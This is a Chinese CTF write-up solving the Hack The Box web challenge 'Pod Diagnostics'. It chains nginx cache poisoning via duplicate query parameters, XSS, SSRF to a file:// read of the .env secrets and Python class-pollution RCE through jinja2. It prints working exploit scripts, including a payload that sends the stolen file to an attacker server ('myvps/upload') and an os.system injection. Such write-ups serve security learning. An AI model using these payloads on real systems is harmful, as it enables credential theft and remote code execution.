---
title: "Hack the Box——Pod Diagnostics"
date: 2023-09-12T08:21:17+08:00
showDate: true
draft: false
tags: ["security","hack the box", "ctf"]
categories: ["security"]
---

## 0x00 剧透警告

目前这道题网上还没有wp（当时做不出来想看看答案但是却搜不到，当然也可能是我搜索能力的问题），感兴趣的师傅可以先做一做，题目质量还行，可惜有个非预期。

## 0x01 访问首页
网站首页是一个系统信息监控的静态页。

![1.png](1.png)

有两个可以交互的地方，一个是点击`Download Diagnostics`会访问`/generate-report`，响应的是pdf的二进制内容，pdf的内容像是用访问这个网站然后导出pdf得到的。

另一个是下拉框选择时间参数，会访问`/stats?period=1m`，响应的内容是当前系统信息的json，没什么有价值的。
```json
{
    "success":true,
    "current":{
        ...
    },
    "average":{
        ...
    }
}
```

## 0x02 代码审计

对网站内容有了一个大致的了解之后，接下来捋代码以及配置细节。

### web

先看web

```python
# main.py
@app.route("/")
def stats_handler():
    return render_template("index.html", reports=fetch_reports(), system_version=system_version)

@app.route("/generate-report")
def generate_report_handler():
    ...
    try:
        pdf_response = requests.get(f"{pdf_generation_URL}/generate?url={quote('http://localhost/')}")
        ...

        return send_file(
            io.BytesIO(pdf_response.content), 
            mimetype="application/json", 
            as_attachment=True,
            download_name="report.pdf"
        )
    except:
        ...

@app.route("/report", defaults={"report_id": None}, methods=["GET"])
@app.route("/report/<report_id>", methods=["GET"])
@auth_required
def report_handler(report_id):
    ...
    return render_template("report.html", report=report, title=title, description=description)

@app.route("/report", defaults={"report_id": None}, methods=["POST"])
@app.route("/report/<report_id>", methods=["POST"])
@auth_required
def submit_report_handler(report_id):
    ...
    return jsonify({"success": True, "report_id": str(report)})

# auth.py
engineer_username = os.environ.get("ENGINEER_USERNAME")
engineer_password = os.environ.get("ENGINEER_PASSWORD")

if engineer_username is None or engineer_password is None:
    print("Missing engineer username and password, shutting down...")
    exit()

class AuthenticationException(Exception):
    pass

def auth_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        try:
            header_value = request.headers.get("Authorization")
            if header_value is None:
                raise AuthenticationException("No Authorization header")

            if not header_value.startswith("Basic "):
                raise AuthenticationException("Only Basic auth supported")
            
            _, encoded_auth = header_value.split(" ")

            decoded_auth = base64.b64decode(encoded_auth).decode()

            username, password = decoded_auth.split(":")

            if username != engineer_username or password != engineer_password:
                raise AuthenticationException("Invalid username and password")

            return f(*args, **kwargs)
        except AuthenticationException as e:
            ...

    return decorated_function

# report.py
def fetch_reports():
    reports = []

    for report_name in os.listdir(report_store):
        reports.append(Report(report_name.replace(".json", "")))

    return reports

def merge(source, destination):
    {
        "__str__": ""
    }
    for key, value in source.items():
        if hasattr(destination, "get"):
            if destination.get(key) and type(value) == dict:
                merge(value, destination.get(key))
            else:
                destination[key] = value
        elif hasattr(destination, key) and type(value) == dict:
            merge(value, getattr(destination, key))
        else:
            setattr(destination, key, value)

def get_date():
    return datetime.datetime.now().strftime("%y/%m/%d %H:%M:%S")

class Report:

    def __init__(self, report_id = None):
        if report_id is not None and not os.path.exists(os.path.join(report_store, report_id + ".json")):
            raise Exception("Report could not be found")
        ...

    def __str__(self):
        return "POD-REPORT-" + self.id

    ...
    def update(self, data, save=True):
        merge(data, self)

        if save:
            self.updated_at = get_date()
            self.save()
    ...
```

web里有四个路由，但是有两个路由有@auth_required装饰器，从auth.py看是实现了http basic认证，账号密码给的初始化代码是，32位的密码爆破应该是不可能了，可能需要文件读取的方式读出来。
```shell
echo "ENGINEER_USERNAME=engineer" > /app/services/web/.env
echo "ENGINEER_PASSWORD=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)" >> /app/services/web/.env
```

那目前只有`/`和`/generate-report`两个路由可以访问，但是这两个路由都没有可控参数，暂时没有什么可以利用的地方。 

### stats
```js
app.use((req, res, next) => {
  res.set("Access-Control-Allow-Origin", "*");
  next();
});

const validPeriods = { "1m": 60_000, "5m": 300_000, "10m": 600_000 };
const statStore = [];

app.get("/stats", async (req, res) => {
  const { period } = req.query;

  if (!period || !validPeriods.hasOwnProperty(period)) {
    return res.json({
      success: false,
      error: `<strong>${period} is invalid.</strong> Please specify one of the following values: ${Object.keys(validPeriods).join(", ")}`,
    });
  }

  const periodData = statStore.filter((result) => result.takenAt < new Date().getTime() + validPeriods[period]);
  const averageData = periodData.reduce(
    (acc, curr) => {
      acc.memoryUsage += curr.memoryUsage;
      acc.cpuUsage += curr.cpuUsage;
      acc.diskUsage += curr.diskUsage;
      return acc;
    },
    { memoryUsage: 0, cpuUsage: 0, diskUsage: 0 }
  );
  ...
  return res.json({
    success: true,
    current: await getStats(),
    average: averageData,
  });
});
```

这个stats服务有一个可控参数period，但是存在一个校验，值被限制为`const validPeriods = { "1m": 60_000, "5m": 300_000, "10m": 600_000 };`对象的键。

这里首先想到的应该是可能存在原型链污染，稍微fuzz了一下并不存在原型链污染。但是发现了一个有趣的输入，当传入的参数为?period[toString]=1的时候，服务端会直接panic,暂时也没有额外的利用。


### pdf

```js
app.get("/generate", async (req, res) => {
  const { url } = req.query;

  if (!url) return res.sendStatus(400);

  const pdf = await generatePDF(url);

  if (!pdf) return res.sendStatus(500);

  res.contentType("application/pdf");
  res.end(pdf);
});
```

pdf有一个路由，生成pdf，url可控，这里可能存在ssrf，但是目前pdf服务没有对外开放端口，只有内网能够访问，那就十分可疑了。

### nginx

最后还有一个nginx配置，nginx只代理了web和stats两个服务，pdf无法直接从外部访问



了解网站的大致内容，我们再来捋一下源码的逻辑。题目给了三个服务+一个反代
|服务|路由|作用|
|---|---|---|
|pdf:3002|/generate?url=|传入url，用puppeteer访问url并导出pdf|
|stats:3001|/stats?period=|传入period，返回系统信息|
|web:3000|/|主页面|
|web:3000|/generate-report|访问pdf/generate?url=localhost并返回响应
|web:3000|/report(需要http auth)|上传报告，获取报告|
|nginx||反代+缓存|


画一个简单丑陋的服务器架构图

![2.png](2.png)


## 0x03 发现漏洞

### 反射型xss
继续审计代码，发现web的`./static/js/stats.js`里存在可控的xss

```js
const updateData = async () => {
  fetch("/stats?period=" + periodSelector.value)
    .then((data) => data.json())
    .then((data) => {
      const { current, average, success, error } = data;

      if (success) {
        ...
        errorAlert.innerHTML = "";
        errorAlert.style.display = "none";
      } else {
        errorAlert.innerHTML = error;
        errorAlert.style.display = "";
      }
    });
};

//resp
{
    "success":false,
    "error":"<strong><img src=1 onerror=alert('xss')> is invalid.</strong> Please specify one of the following values: 1m, 5m, 10m"
}
```

这里如果`/stats`路由返回的success字段不是true，js会把error写到html，造成反射型xss。
![3.png](3.png)

###  python原型链污染

```python
# report.py
def merge(source, destination):
    for key, value in source.items():
        if hasattr(destination, "get"):
            if destination.get(key) and type(value) == dict:
                merge(value, destination.get(key))
            else:
                destination[key] = value
        elif hasattr(destination, key) and type(value) == dict:
            merge(value, getattr(destination, key))
        else:
            setattr(destination, key, value)
```

report.py这里存在一个很明显的原型链污染，但是目前web路由有http basic认证，暂时无法利用原型链污染。

到这貌似已经卡住了，虽然有洞但是没办法利用。

但是猜测应该是通过

后端访问localhost->xss->文件读取->读取.env的账号密码->原型链污染rce

### nginx缓存key+参数解析差异

根据猜测的利用路径，怎么让后端的puppeteer访问存在xss的页面是一个问题，因为后端puppeteer访问的时候没有任何可控的参数，所以貌似没有办法直接触发xss。

```
http {
        ...
        proxy_cache_path /run/nginx/cache keys_zone=stat_cache:10m inactive=10s;
        server {
            ...
            location = /stats {
                proxy_cache stat_cache;
                proxy_cache_key "$arg_period";
                proxy_cache_valid 200 15s;
                proxy_pass http://127.0.0.1:3001;
            }

            location / { 
                proxy_pass http://127.0.0.1:3000;
            }
        }
}
```

经过漫长的审计和debug，发现了nginx配置里好像有点问题，这里nginx为`/stats`设置了15s的缓存，存储的内容为`period=value`。

但是，当传入的参数为`?period=value1&period=value2`，对于相同的key，nginx只会解析第一个参数（可以看下nginx源码[https://github.com/nginx/nginx/blob/master/src/http/ngx_http_parse.c#L2082](https://github.com/nginx/nginx/blob/master/src/http/ngx_http_parse.c#L2082)查找参数这块）。

虽然nginx只会解析第一个参数，但是他会把uri全部转发给后端服务器。那么当我们传入的参数为`?period=value1&period=value2`，看一下qs，也就是express默认的url解析库是怎么解析的。

```js
var qs = require('qs');

var obj = qs.parse('period=value1&period=value2');

console.log(obj)
// $ node test.js
// { period: [ 'value1', 'value2' ] }
```

可以看到这种参数会被qs解析成数组。这两种解析的差异配上nginx的缓存，在加上stats服务的响应内容可控，period作为数组，toString方法相当于是 `",".join(period)`。因为缓存内容只和period参数名和period参数值有关，攻击者只要发送`?period=1m&period=<img src=1 onerror=alert('poisoned')>`，nginx会用`period=1m`当成缓存key（猜的，具体是什么格式得看nginx源码），内容为响应的内容。
```js
    return res.json({
      success: false,
      error: `<strong>${period} is invalid.</strong> Please specify one of the following values: ${Object.keys(validPeriods).join(", ")}`,
    });
```

![4.png](4.png)
![5.png](5.png)

可以看到，不同的请求参数响应的内容和ETag都是一样的。

## 0x04 xss（跨域）->ssrf

通过缓存中毒，我们可以实现不控制参数也能让后端puppeteer访问的时候xss，相当于是反射型xss变成存储型了。

下一步应该是如何能读到.env的文件的账号密码。但是由于浏览器的限制，默认情况下是没办法加载本地文件的。

之前在审代码的时候发现，在pdf和stats，都加了个任意跨域，也就是可以从任意的网站源访问这个后端服务。

```js
app.use((req, res, next) => {
  res.set("Access-Control-Allow-Origin", "*");
  next();
});
```

那我们可以在恶意的js代码中访问`http://127.0.0.1:3002/generate?url=`(pdf服务)，url可控，岂不是就ssrf了。

再加上浏览器是支持file协议的，那就可以实现任意文件读取了。xss_exp如下，思路就是通过缓存中毒注入恶意js，然后访问`/generate-report`让后端触发xss实现文件读取，这里还有一个点就是按理直接注入`<iframe src="http://127.0.0.1:3002/generate?url=file:///app/services/web/.env" width=200 height=200></iframe>`（本地浏览器是可以加载iframe的），后端访问的pdf里应该就能加载包含这个iframe的内容，但是可能puppeteer导出pdf的时候无法把iframe加载进去，所以只能再起一个服务接收得到的pdf。

```python
def exp(payload):
    proxies = {
        "http": "http://127.0.0.1:8080"
    }
    base_url = "http://target:port"
    url = "{}/stats?period=1m&period={}".format(base_url, quote(payload))
    requests.get(url, proxies=proxies)

    url = "{}/generate-report".format(base_url)
    # 让后端puppeteer触发xss
    r = requests.get(url, proxies=proxies)
    with open("res.pdf", "wb") as f:
        f.write(r.content)


if __name__ == '__main__':
    xss_code = '''fetch('http://127.0.0.1:3002/generate?url=file:///app/services/web/.env')
.then(response => response.blob())
.then(blob => {
    # 把得到的pdf上传
    return fetch('http://myvps/upload', {
        method: 'POST',
        body: blob,
    });
})
'''
    xss = "eval(atob(\"{}\"))".format(b64encode(xss_code.encode()).decode())
    payload = "<img src=1 onerror={} >".format(xss)
    exp(payload)

# 文件接收 app.py
from flask import Flask, request
from flask_cors import CORS
app = Flask(__name__)
CORS(app)

@app.route('/upload', methods=['POST'])
def upload():
    with open('./uploaded_file.pdf', 'wb') as f:
        f.write(request.data)
    return 'File uploaded and saved.'

if __name__ == '__main__':
    app.run(host='0.0.0.0')
```

成功读到密码

![6.png](6.png)

## 0x05 python原型链污染利用

读到账号密码之后就简单了，直接用python原型链污染rce，关于python原型链污染，这个[Python原型链污染变体(prototype-pollution-in-python)](https://tttang.com/archive/1876/)讲的很详细，原理攻击面利用基本都讲了，值得学习一波。

exp如下
```python
def exp(payload):
    url = "http://target:port/report"

    auth = f"engineer:123456"
    headers = {
        "Authorization": "Basic {}".format(base64.b64encode(auth.encode()).decode())
    }
    requests.post(url, headers=headers, json=payload, proxies={"http": "http://127.0.0.1:8080"})
    # 触发模板渲染->触发rce
    requests.get("http://target:port")
    print(requests.get("http://target:port/static/flag").text)


if __name__ == '__main__':
    payload = {
        "title": "1",
        "description": "3",
        "__init__": {
            "__globals__": {
                "__loader__": {
                    "__init__": {
                        "__globals__": {
                            "sys": {
                                "modules": {
                                    "jinja2": {
                                        "runtime": {
                                            "exported": [
                                                "*;__import__('os').system('/readflag > /app/services/web/static/flag');#"
                                            ]
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    exp(payload)
```

## 0x06 总结
在测rce的时候发现whoami打出来的是root，/flag是400权限，ltb师傅一眼看出来这里有非预期，用xss+ssrf一打发现果然可以正常读/flag。还好是做完之后发现的，不然会少一部分乐趣了。
这道题主要还是漏洞入口藏得太深了，知道里面有洞，但是找不到入口太痛苦。一旦找到了参数解析差异导致的缓存中毒这个点，后面的其实都比较常规了。



